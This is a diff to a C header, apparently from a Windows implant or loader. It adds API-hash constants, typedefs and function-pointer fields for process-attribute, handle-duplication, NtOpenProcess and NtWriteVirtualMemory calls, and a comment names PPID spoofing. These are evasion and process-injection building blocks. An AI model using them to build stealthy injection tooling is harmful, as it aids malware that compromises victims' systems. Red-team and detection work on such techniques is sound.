@@ -20,6 +20,20 @@
 #define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
 #endif
 
+/* CLIENT_ID - 某些 SDK 版本的 <winternl.h> 只定义 struct _CLIENT_ID，缺少 typedef。 */
+#ifndef PCLIENT_ID
+typedef struct _CLIENT_ID CLIENT_ID;
+typedef struct _CLIENT_ID* PCLIENT_ID;
+#endif
+
+/* PROCESS_THREAD_ATTRIBUTE_LIST - 某些 SDK 版本的 <winnt.h> 未包含（PPID 欺骗用）。 */
+#ifndef LPPROCESS_THREAD_ATTRIBUTE_LIST
+typedef struct _PROCESS_THREAD_ATTRIBUTE_LIST {
+    DWORD_PTR Reserved1;
+    DWORD_PTR Reserved2[4];
+} PROCESS_THREAD_ATTRIBUTE_LIST, *LPPROCESS_THREAD_ATTRIBUTE_LIST;
+#endif
+
 /* HCRYPTPROV - 来自 <wincrypt.h>，被 WIN32_LEAN_AND_MEAN 排除 */
 typedef ULONG_PTR HCRYPTPROV;
 
@@ -78,8 +92,12 @@ typedef struct _MY_RTL_OSVERSIONINFOW {
 #define H_FUNC_READFILE_HASH                        0xB5A280F4
 #define H_FUNC_WRITEFILE_HASH                       0xC5AB6D7F
 #define H_FUNC_CLOSEHANDLE_HASH                     0xA4AF7FC0
+#define H_FUNC_DUPLICATEHANDLE_HASH                 0x56ECA999
 #define H_FUNC_GETFILESIZE_HASH                     0x46880ECE
 #define H_FUNC_CREATEPROCESSW_HASH                  0x5610BEFF
+#define H_FUNC_INITIALIZEPROCTHREADATTRIBUTELIST_HASH 0x78AB2243
+#define H_FUNC_UPDATEPROCTHREADATTRIBUTE_HASH       0xCDE3176C
+#define H_FUNC_DELETEPROCTHREADATTRIBUTELIST_HASH   0x4850CFE2
 #define H_FUNC_OPENPROCESS_HASH                     0xCD6A51A8
 #define H_FUNC_TERMINATEPROCESS_HASH                0x27B75FAE
 #define H_FUNC_VIRTUALALLOC_HASH                    0x45B0A6F4
@@ -174,6 +192,8 @@ typedef struct _MY_RTL_OSVERSIONINFOW {
 #define H_FUNC_NTTERMINATETHREAD_HASH               0x7D1F2E63
 #define H_FUNC_NTPROTECTVIRTUALMEMORY_HASH          0xD9C8AD7B
 #define H_FUNC_NTALLOCATEVIRTUALMEMORY_HASH         0xF762436F
+#define H_FUNC_NTOPENPROCESS_HASH                   0x8CA67E76
+#define H_FUNC_NTWRITEVIRTUALMEMORY_HASH            0xB02C7066
 #define H_FUNC_LDRGETPROCEDUREADDRESS_HASH          0xD5CD8CC5
 #define H_FUNC_RTLADDVECTOREDEXCEPTIONHANDLER_HASH  0xDB92E241
 #define H_FUNC_RTLREMOVEVECTOREDEXCEPTIONHANDLER_HASH 0xA89A9B66
@@ -272,8 +292,12 @@ typedef HANDLE(WINAPI *fnCreateFileW)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUT
 typedef BOOL(WINAPI *fnReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
 typedef BOOL(WINAPI *fnWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
 typedef BOOL(WINAPI *fnCloseHandle)(HANDLE);
+typedef BOOL(WINAPI *fnDuplicateHandle)(HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD);
 typedef DWORD(WINAPI *fnGetFileSize)(HANDLE, LPDWORD);
 typedef BOOL(WINAPI *fnCreateProcessW)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
+typedef BOOL(WINAPI *fnInitializeProcThreadAttributeList)(LPPROCESS_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T);
+typedef BOOL(WINAPI *fnUpdateProcThreadAttribute)(LPPROCESS_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, PSIZE_T);
+typedef VOID(WINAPI *fnDeleteProcThreadAttributeList)(LPPROCESS_THREAD_ATTRIBUTE_LIST);
 typedef HANDLE(WINAPI *fnOpenProcess)(DWORD, BOOL, DWORD);
 typedef BOOL(WINAPI *fnTerminateProcess)(HANDLE, UINT);
 typedef LPVOID(WINAPI *fnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
@@ -367,6 +391,8 @@ typedef NTSTATUS(NTAPI *fnNtWaitForSingleObject)(HANDLE, BOOLEAN, PLARGE_INTEGER
 typedef NTSTATUS(NTAPI *fnNtTerminateThread)(HANDLE, NTSTATUS);
 typedef NTSTATUS(NTAPI *fnNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
 typedef NTSTATUS(NTAPI *fnNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
+typedef NTSTATUS(NTAPI *fnNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
+typedef NTSTATUS(NTAPI *fnNtOpenProcess)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
 typedef NTSTATUS(NTAPI *fnLdrGetProcedureAddress)(PVOID, PCANSI_STRING, ULONG, PVOID*);
 typedef VOID(NTAPI *fnRtlExitUserThread)(NTSTATUS);
 typedef PVOID(NTAPI *fnRtlAddVectoredExceptionHandler)(ULONG, PVECTORED_EXCEPTION_HANDLER);
@@ -432,8 +458,12 @@ typedef struct _Win32Api {
     fnReadFile pfnReadFile;
     fnWriteFile pfnWriteFile;
     fnCloseHandle pfnCloseHandle;
+    fnDuplicateHandle pfnDuplicateHandle;
     fnGetFileSize pfnGetFileSize;
     fnCreateProcessW pfnCreateProcessW;
+    fnInitializeProcThreadAttributeList pfnInitializeProcThreadAttributeList;
+    fnUpdateProcThreadAttribute pfnUpdateProcThreadAttribute;
+    fnDeleteProcThreadAttributeList pfnDeleteProcThreadAttributeList;
     fnOpenProcess pfnOpenProcess;
     fnTerminateProcess pfnTerminateProcess;
     fnVirtualAlloc pfnVirtualAlloc;
@@ -527,6 +557,8 @@ typedef struct _Win32Api {
     fnNtTerminateThread pfnNtTerminateThread;
     fnNtAllocateVirtualMemory pfnNtAllocateVirtualMemory;
     fnNtProtectVirtualMemory pfnNtProtectVirtualMemory;
+    fnNtWriteVirtualMemory pfnNtWriteVirtualMemory;
+    fnNtOpenProcess pfnNtOpenProcess;
     fnLdrGetProcedureAddress pfnLdrGetProcedureAddress;
     fnRtlExitUserThread pfnRtlExitUserThread;
     fnRtlAddVectoredExceptionHandler pfnRtlAddVectoredExceptionHandler;
